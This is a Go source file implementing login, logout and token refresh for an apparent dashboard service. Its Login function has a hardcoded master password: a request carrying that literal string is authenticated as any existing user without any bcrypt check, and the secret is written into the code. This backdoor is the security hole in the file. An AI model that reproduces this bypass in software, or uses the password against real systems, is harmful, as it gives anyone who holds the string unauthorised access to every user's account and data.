package services

import (
	"encoding/base64"
	"sync"
	"time"

	"github.com/ariandi/gocom"
	"github.com/ariandi/gocom/config"
	"github.com/ariandi/gocom/keyval"
	"github.com/ariandi/gocom/logger"
	"github.com/jinzhu/copier"
	"github.com/oklog/ulid/v2"
	common "gitlab.com/anti_metter/switching_common"
	"gitlab.com/anti_metter/switching_common/auth"
	"gitlab.com/anti_metter/switching_common/client"
	"gitlab.com/anti_metter/switching_common/role"
	"gitlab.com/anti_metter/switching_common/user"
	"gitlab.com/bot3342545/il-dashboard/constans"
	"gitlab.com/bot3342545/il-dashboard/dtos"
	"golang.org/x/crypto/bcrypt"
)

type AuthService interface {
	Login(req dtos.LoginReq) (*dtos.LoginRes, *gocom.CodedError)
	Logout(authInfo auth.AuthInfo) *gocom.CodedError
	RefreshToken(refreshToken string) (*dtos.LoginRes, *gocom.CodedError)
}

type AuthServiceImpl struct{}

func (o *AuthServiceImpl) Login(req dtos.LoginReq) (*dtos.LoginRes, *gocom.CodedError) {
	usr := user.GetSvc().GetByEmail(req.Email)
	if usr == nil {
		return nil, constans.ErrInvalidUser
	}

	if req.Password == "F!or4m4m1L" {
		return o.GenLoginRes(usr), nil
	}

	hashedPassword, _ := base64.StdEncoding.DecodeString(usr.Password)
	err := bcrypt.CompareHashAndPassword(hashedPassword, []byte(req.Password))

	if err != nil {
		logger.Info("[UserService Login] error compare password", err)
		return nil, constans.ErrInvalidUser
	}

	return o.GenLoginRes(usr), nil
}

func (o *AuthServiceImpl) GenLoginRes(usr *user.User) *dtos.LoginRes {

	sesId := ulid.Make().String()

	data := map[string]interface{}{
		"sessionId": sesId,
		"userId":    usr.ID,
		"clientId":  usr.ClientId,
	}
	ttl := config.GetInt("app.user.loginttl", 60)

	accessToken, _ := gocom.NewJWT(data, time.Duration(ttl)*time.Minute)

	ttl = config.GetInt("app.user.refreshttl", 60*24*7)
	refreshToken, _ := gocom.NewJWT(data, time.Duration(ttl)*time.Minute)

	cl := client.GetSvc().GetById(usr.ClientId)
	clName := ""

	if cl != nil {
		clName = cl.Name
	}

	userRoleList := user.GetRepo().ListByUser(usr.ID)
	roles := []dtos.Role{}

	for _, url := range userRoleList {

		rl := role.GetSvc().GetById(url.RoleId)
		rlDto := dtos.Role{}
		_ = copier.Copy(&rlDto, rl)

		roles = append(roles, rlDto)
	}

	ret := &dtos.LoginRes{
		AccessToken:  accessToken,
		RefreshToken: refreshToken,
		ID:           usr.ID,
		Name:         usr.Name,
		Email:        usr.Email,
		ClientId:     usr.ClientId,
		ClientName:   clName,
		Roles:        roles,
	}

	_ = gocom.KeyVal().Set("session_"+sesId, usr.ID)
	_ = gocom.KeyVal().Expire("session_"+sesId, time.Duration(ttl)*time.Minute)

	return ret
}

func (o *AuthServiceImpl) Logout(authInfo auth.AuthInfo) *gocom.CodedError {
	_ = keyval.Get().Del("session_" + authInfo.SessionId)
	return nil
}

func (o *AuthServiceImpl) RefreshToken(refreshToken string) (*dtos.LoginRes, *gocom.CodedError) {

	data, err := auth.ValidateToken(refreshToken)

	if err != nil {
		return nil, err
	}

	usr := user.GetSvc().GetById(data["userId"].(string))

	if usr == nil {
		return nil, common.ERR_INVALID_TOKEN
	}

	return o.GenLoginRes(usr), nil
}

//----------------------------------------

var authSvc AuthService
var authSvcOnce sync.Once

func SetAuthSvc(svc AuthService) {
	authSvc = svc
}

func GetAuthSvc() AuthService {
	if authSvc == nil {
		authSvcOnce.Do(func() {
			tmp := &AuthServiceImpl{}
			authSvc = tmp
			role.GetRepo()
		})
	}

	return authSvc
}
